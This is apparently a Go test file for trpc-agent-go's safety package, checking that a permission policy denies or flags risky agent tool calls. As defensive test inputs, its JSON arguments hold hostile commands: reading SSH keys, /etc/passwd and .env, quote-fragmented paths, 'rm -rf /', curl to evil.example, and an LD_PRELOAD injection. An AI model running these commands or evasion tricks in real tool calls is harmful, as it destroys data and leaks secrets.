//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestPermissionPolicyMapsWorkspaceExec(t *testing.T) {
	var audit bytes.Buffer
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(&audit),
	)
	args := []byte(`{"command":"cat ~/.ssh/id_rsa"}`)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
	require.Contains(t, audit.String(), `"decision":"deny"`)
}

func TestPermissionPolicyScansEffectiveArgvSensitivePaths(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))

	cases := []struct {
		name string
		args string
	}{
		{
			name: "fragmented path",
			args: `{"command":"cat /e'tc/passwd'"}`,
		},
		{
			name: "fragmented file url",
			args: `{"command":"curl file:///e'tc/passwd'"}`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  "workspace_exec",
				Arguments: []byte(tc.args),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, ruleSensitivePath)
		})
	}
}

func TestPermissionPolicyScansWorkspaceStdin(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"cat","stdin":"token=sk-secret"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSecretLeakage)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"sh","stdin":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyScansWriteStdinTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, tc := range []struct {
		name     string
		toolName string
		args     string
	}{
		{
			name:     "workspace write stdin",
			toolName: "workspace_write_stdin",
			args:     `{"session_id":"ws-1","chars":"rm -rf /","append_newline":true}`,
		},
		{
			name:     "host write stdin",
			toolName: "write_stdin",
			args:     `{"session_id":"host-1","chars":"cat ~/.ssh/id_rsa","submit":true}`,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  tc.toolName,
				Arguments: []byte(tc.args),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
		})
	}
}

func TestPermissionPolicyScansUnknownToolArguments(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_fetch",
		Arguments: []byte(`{"url":"https://evil.example/steal"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleNetworkEgress)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_read_file",
		Arguments: []byte(`{"path":".env"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"nested":{"command":"rm -rf /"}}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyHandlesHeuristicMCPWrappersWithExtraFields(t *testing.T) {
	policy := DefaultPolicy()
	policy.UnknownToolAction = DecisionAllow
	pp := NewPermissionPolicy(WithPolicy(policy))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "mcp_exec",
		Arguments: []byte(`{
			"command":"echo ok",
			"input_file":"/etc/passwd"
		}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
}

func TestPermissionPolicyCustomToolBackend(t *testing.T) {
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithToolBackend("custom_shell", BackendWorkspaceExec),
		WithToolBackend("custom_code", BackendCodeExec),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "custom_shell",
		Arguments: []byte(`{"command":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "custom_code",
		Arguments: []byte(`{"code_blocks":[{"language":"bash","code":"cat .env"}]}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
}

func TestPermissionPolicyMapsSkillCommandTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  tool.SkillRunToolName,
		Arguments: []byte(`{"command":"curl evil.example/steal","timeout":600}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleNetworkEgress)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  tool.SkillExecToolName,
		Arguments: []byte(`{"command":"go test ./...","tty":true}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  tool.SkillWriteStdinToolName,
		Arguments: []byte(`{"session_id":"s1","chars":"cu"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)
	require.Contains(t, decision.Reason, ruleInteractiveStdin)
}

func TestPermissionPolicyHonorsUnknownToolFallbackWithAllowLevelFindings(t *testing.T) {
	cases := []struct {
		name     string
		fallback Decision
		want     tool.PermissionAction
	}{
		{name: "ask", fallback: DecisionAsk, want: tool.PermissionActionAsk},
		{name: "deny", fallback: DecisionDeny, want: tool.PermissionActionDeny},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			policy := DefaultPolicy()
			policy.UnknownToolAction = tt.fallback
			policy.NonWhitelistedNetworkAction = DecisionAllow
			pp := NewPermissionPolicy(WithPolicy(policy))
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  "mcp_fetch",
				Arguments: []byte(`{"url":"https://evil.example/steal"}`),
			})
			require.NoError(t, err)
			require.Equal(t, tt.want, decision.Action)
			require.Contains(t, decision.Reason, ruleNetworkEgress)
		})
	}
}

func TestPermissionPolicyUsesEffectiveWorkspaceTimeout(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSec = 299
	pp := NewPermissionPolicy(WithPolicy(policy))

	cases := []struct {
		name     string
		toolName string
		args     string
	}{
		{name: "workspace omitted", toolName: tool.WorkspaceExecToolName, args: `{"command":"echo ok"}`},
		{name: "workspace zero", toolName: tool.WorkspaceExecToolName, args: `{"command":"echo ok","timeout_sec":0}`},
		{name: "skill run omitted", toolName: tool.SkillRunToolName, args: `{"command":"echo ok"}`},
		{name: "skill exec negative", toolName: tool.SkillExecToolName, args: `{"command":"echo ok","timeout":-1}`},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  tt.toolName,
				Arguments: []byte(tt.args),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionAsk, decision.Action)
			require.Contains(t, decision.Reason, ruleResourceRuntime)
		})
	}
}

func TestPermissionPolicyDoesNotApplyWorkspaceTimeoutToStdinTools(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSec = 299
	pp := NewPermissionPolicy(WithPolicy(policy))

	for _, toolName := range []string{
		tool.WorkspaceWriteStdinToolName,
		tool.SkillWriteStdinToolName,
	} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  toolName,
				Arguments: []byte(`{"session_id":"s1","chars":"hello"}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionAsk, decision.Action)
			require.Contains(t, decision.Reason, ruleInteractiveStdin)
			require.NotContains(t, decision.Reason, ruleResourceRuntime)
		})
	}
}

func TestPermissionPolicyScansSkillOutputFiles(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  toolName,
				Arguments: []byte(`{"command":"echo ok","output_files":[".env"]}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, ruleSensitivePath)
		})
	}
}

func TestPermissionPolicyScansSkillOutputsGlobs(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName: toolName,
				Arguments: []byte(`{
					"command":"echo ok",
					"outputs":{"globs":[".env"]}
				}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, ruleSensitivePath)
		})
	}
}

func TestPermissionPolicyScansSkillDeclarativeInputs(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName: toolName,
				Arguments: []byte(`{
					"command":"cat work/inputs/passwd",
					"inputs":[{"from":"host:///etc/passwd","to":"work/inputs/passwd"}]
				}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, ruleSensitivePath)
		})
	}
}

func TestParseHostExecAppliesEffectiveDefaultTimeout(t *testing.T) {
	tests := []struct {
		name string
		args []byte
	}{
		{name: "omitted", args: []byte(`{"command":"echo ok"}`)},
		{name: "zero", args: []byte(`{"command":"echo ok","timeout_sec":0}`)},
		{name: "negative", args: []byte(`{"command":"echo ok","timeout_sec":-1}`)},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, err := parseHostExec("exec_command", tt.args)
			require.NoError(t, err)
			require.Equal(t, DefaultHostExecTimeoutSec, req.TimeoutSec)
		})
	}
}

func TestPermissionPolicyMapsMCPCommandTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"cmd":"rm -rf /","env":{"LD_PRELOAD":"x"}}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"args":["rm","-rf","/"]}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyFileOptions(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	auditPath := filepath.Join(dir, "audit.jsonl")
	require.NoError(t, os.WriteFile(policyPath, []byte(`
allowed_commands: [echo]
denied_commands: [rm]
parse_error_action: ask
`), 0o600))
	pp := NewPermissionPolicy(
		WithPolicyFile(policyPath),
		WithAuditFile(auditPath),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	audit, err := os.ReadFile(auditPath)
	require.NoError(t, err)
	require.Contains(t, string(audit), `"decision":"deny"`)
}

func TestPermissionPolicyStrictPolicyFileOption(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	require.NoError(t, os.WriteFile(policyPath, []byte("unknown_field: true\n"), 0o600))
	pp := NewPermissionPolicy(WithStrictPolicyFile(policyPath))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "initialization failed")
}

func TestPermissionPolicyAuditFailureMode(t *testing.T) {
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(failingWriter{}),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)

	pp = NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(failingWriter{}),
		WithAuditFailureMode(AuditFailClosed),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")

	pp = NewPermissionPolicy(WithPolicy(ProductionPolicy()))
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")

	p := DefaultPolicy()
	p.AuditFailureMode = AuditFailClosed
	pp = NewPermissionPolicy(
		WithPolicy(p),
		WithAuditWriter(failingWriter{}),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	var audit bytes.Buffer
	pp = NewPermissionPolicy(
		WithAuditWriter(&audit),
		WithPolicy(DefaultPolicy()),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
	require.Contains(t, audit.String(), `"decision":"allow"`)

	pp = NewPermissionPolicy(
		WithAuditWriter(failingWriter{}),
		WithPolicy(ProductionPolicy()),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")
}

func TestPermissionPolicyFailClosedRejectsUnusableConfiguredSinks(t *testing.T) {
	tests := []struct {
		name string
		opt  PermissionOption
	}{
		{
			name: "nil writer",
			opt:  WithAuditWriter(nil),
		},
		{
			name: "empty file path",
			opt:  WithAuditFile(""),
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pp := NewPermissionPolicy(
				WithPolicy(ProductionPolicy()),
				tc.opt,
			)
			decision, err := pp.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "workspace_exec",
					Arguments: []byte(`{"command":"echo ok"}`),
				},
			)
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, "audit failed")
		})
	}
}

func TestPermissionPolicyScansStructuredSkillOutputLimits(t *testing.T) {
	req, err := parseSkillRun("skill_run", []byte(`{
		"command":"echo ok",
		"outputs":{"inline":true}
	}`))
	require.NoError(t, err)
	require.Equal(t, 64*1024*1024, req.MaxOutputBytes)

	policy := DefaultPolicy()
	policy.MaxOutputBytes = 1 << 20
	pp := NewPermissionPolicy(WithPolicy(policy))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "skill_run",
		Arguments: []byte(`{
			"command":"echo ok",
			"outputs":{"inline":true}
		}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)
	require.Contains(t, decision.Reason, ruleResourceOutput)
}

func TestPermissionPolicyWithScannerDoesNotShareRecordingSink(t *testing.T) {
	sink := &errorAuditSink{}
	scanner := NewScanner(DefaultPolicy(), WithAuditSink(sink))
	pp1 := NewPermissionPolicy(WithScanner(scanner), WithAuditFailureMode(AuditFailClosed))
	pp2 := NewPermissionPolicy(WithScanner(scanner), WithAuditFailureMode(AuditFailClosed))

	require.NotSame(t, pp1.scanner, pp2.scanner)
	require.NotSame(t, pp1.scanner.audit, pp2.scanner.audit)
	require.Same(t,
		pp1.scanner.audit.(*recordingAuditSink).sink,
		pp2.scanner.audit.(*recordingAuditSink).sink,
	)
	_, ok := scanner.audit.(*recordingAuditSink)
	require.False(t, ok)
}

func TestPermissionPolicyWithScannerScopesConcurrentAuditFailures(t *testing.T) {
	sink := newCoordinatedAuditSink("fail_workspace_exec")
	scanner := NewScanner(DefaultPolicy(), WithAuditSink(sink))
	failPolicy := NewPermissionPolicy(WithScanner(scanner), WithAuditFailureMode(AuditFailClosed))
	okPolicy := NewPermissionPolicy(WithScanner(scanner), WithAuditFailureMode(AuditFailClosed))

	start := make(chan struct{})
	results := make(chan auditPolicyResult, 2)
	run := func(toolName string, pp *PermissionPolicy) {
		<-start
		decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName:  toolName,
			Arguments: []byte(`{"command":"echo ok"}`),
		})
		results <- auditPolicyResult{toolName: toolName, decision: decision, err: err}
	}

	go run("fail_workspace_exec", failPolicy)
	go run("ok_workspace_exec", okPolicy)
	close(start)

	seen := map[string]bool{}
	for len(seen) < 2 {
		select {
		case toolName := <-sink.ready:
			seen[toolName] = true
		case <-time.After(5 * time.Second):
			t.Fatal("timed out waiting for concurrent audit writes")
		}
	}
	close(sink.release)

	got := map[string]auditPolicyResult{}
	for len(got) < 2 {
		select {
		case result := <-results:
			got[result.toolName] = result
		case <-time.After(5 * time.Second):
			t.Fatal("timed out waiting for permission decisions")
		}
	}

	require.True(t, seen["fail_workspace_exec"])
	require.True(t, seen["ok_workspace_exec"])
	require.NoError(t, got["fail_workspace_exec"].err)
	require.Equal(t, tool.PermissionActionDeny, got["fail_workspace_exec"].decision.Action)
	require.Contains(t, got["fail_workspace_exec"].decision.Reason, "audit failed")
	require.NoError(t, got["ok_workspace_exec"].err)
	require.Equal(t, tool.PermissionActionAllow, got["ok_workspace_exec"].decision.Action)
}

func TestPermissionPolicyMapsHostExecAndCodeExec(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	tty := true
	hostArgs := mustJSON(t, map[string]any{
		"command": "go test ./...",
		"tty":     tty,
	})
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "hostexec_exec_command",
		Arguments: hostArgs,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)

	codeArgs := mustJSON(t, map[string]any{
		"code_blocks": []map[string]string{{
			"language": "bash",
			"code":     "cat .env",
		}},
	})
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: codeArgs,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
}

func TestPermissionPolicyUsesPolicyConfig(t *testing.T) {
	explicitFalse := false
	pp := NewPermissionPolicy(WithPolicyConfig(PolicyConfig{
		DenySecretLeakage: &explicitFalse,
	}))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo token=sk-12345678901234567890"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
}

func TestPermissionPolicyScansDoubleEncodedCodeBlocks(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "execute_code",
		Arguments: []byte(`{
			"code_blocks":"[{\"language\":\"bash\",\"code\":\"cat .env\"}]"
		}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
}

type failingWriter struct{}

func (failingWriter) Write([]byte) (int, error) {
	return 0, errors.New("write failed")
}

var _ io.Writer = failingWriter{}

type coordinatedAuditSink struct {
	failTool string
	ready    chan string
	release  chan struct{}
}

func newCoordinatedAuditSink(failTool string) *coordinatedAuditSink {
	return &coordinatedAuditSink{
		failTool: failTool,
		ready:    make(chan string, 2),
		release:  make(chan struct{}),
	}
}

func (s *coordinatedAuditSink) WriteAudit(ev AuditEvent) error {
	s.ready <- ev.ToolName
	<-s.release
	if ev.ToolName == s.failTool {
		return errors.New("audit failed")
	}
	return nil
}

type auditPolicyResult struct {
	toolName string
	decision tool.PermissionDecision
	err      error
}

func mustJSON(t *testing.T, v any) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	require.NoError(t, err)
	return b
}
